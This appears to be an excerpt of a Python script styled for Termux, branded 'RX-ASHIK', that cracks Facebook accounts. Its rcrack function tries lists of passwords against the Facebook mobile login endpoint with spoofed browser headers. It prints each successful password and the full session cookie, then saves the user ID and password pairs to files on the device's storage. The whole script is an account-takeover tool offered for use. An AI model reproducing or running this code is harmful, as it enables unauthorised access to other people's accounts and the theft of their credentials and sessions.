...
ha = current.day
today = date.today()
os.system('xdg-open https://github.com/rx-ashik-yt-okz')
logo =("""
...
\033[1;96m    ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m MD ASHEKUR ISLAM        \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐌𝐃 ASHEKUR ISLAM \033[1;93m║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m 𝗔𝗦𝗛𝗜𝗞 TERMUX COMMEND ZONE....           \033[1;93m ║
 ╚═════════════════[\033[1;32m 𝗥𝗫-𝗔𝗦𝗛𝗜𝗞 \033[1;32m]══════════════════╝""")
loop = 0
oks = []
cps = []
def clear():
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5624.212", "Google Chrome";v="112.0.5624.212"',
            'sec-ch-ua-mobile': '?1',
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5624.212 Mobile Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝗥𝗫-𝗔𝗦𝗛𝗜𝗞-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝗥𝗫-𝗔𝗦𝗛𝗜𝗞-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/𝗥𝗫-𝗔𝗦𝗛𝗜𝗞-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝗥𝗫-𝗔𝗦𝗛𝗜𝗞{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
